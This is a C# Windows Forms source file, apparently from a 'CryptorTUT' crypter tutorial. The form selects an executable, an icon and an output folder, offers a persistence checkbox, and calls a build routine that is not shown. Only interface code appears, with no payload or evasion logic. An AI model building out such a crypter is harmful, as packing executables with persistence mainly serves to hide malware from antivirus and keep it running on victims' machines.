using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CryptorTUT
{
    public partial class XC : Form
    {
        bool mousedDown;
        private Point offset;
        public XC()
        {
            InitializeComponent();
           
        }
        
        private void button3_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void MouseDown_Event(object sender, MouseEventArgs e)
        {
            offset.X = e.X;
            offset.Y = e.Y;
            mousedDown = true;

        }

        private void MouseMove_Event(object sender, MouseEventArgs e)
        {
            if (mousedDown == true) 
            {
                Point CurrnentScreenPos = PointToScreen(e.Location);
                Location = new Point(CurrnentScreenPos.X - offset.X, CurrnentScreenPos.Y - offset.Y);
            }
        }

        private void MouseUp_Event(object sender, MouseEventArgs e)
        {
            mousedDown = false;
        }

        private void ChooseFileB_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog1 = new OpenFileDialog();
            openFileDialog1.Title = "Select File";
            openFileDialog1.InitialDirectory = @"C:\";
            openFileDialog1.Filter = "Executable Files (*.exe)|*.exe";
            openFileDialog1.FilterIndex = 1;
            openFileDialog1.ShowDialog();

            if (openFileDialog1.FileName != "")
            {
                textBox1.Text = openFileDialog1.FileName;
            }
            else
            {
                MessageBox.Show("Please Select A File.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

            }

        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog1 = new OpenFileDialog();
            openFileDialog1.Title = "Select Icon File";
            openFileDialog1.InitialDirectory = @"C:\";
            openFileDialog1.Filter = "Icon Files (*.ico)|*.ico";
            openFileDialog1.FilterIndex = 1;
            openFileDialog1.ShowDialog();



        }

        private void button4_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog diag = new FolderBrowserDialog();
            if (diag.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                textBox3.Text = diag.SelectedPath;
            }
            else
            {
                MessageBox.Show("Please Select A Folder", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void XC_Load(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            
            if (string.IsNullOrEmpty(textBox1.Text) ||  string.IsNullOrEmpty(textBox3.Text))
            {
                MessageBox.Show("Please fill in all fields before building.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            
            SetupBuild build = new SetupBuild
            {
                InputPath = textBox1.Text,
                IconPath = textBox2.Text,
                LocationPath = textBox3.Text,
                persistence = checkBox1.Checked
            };


                build.Build();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }
    }

}
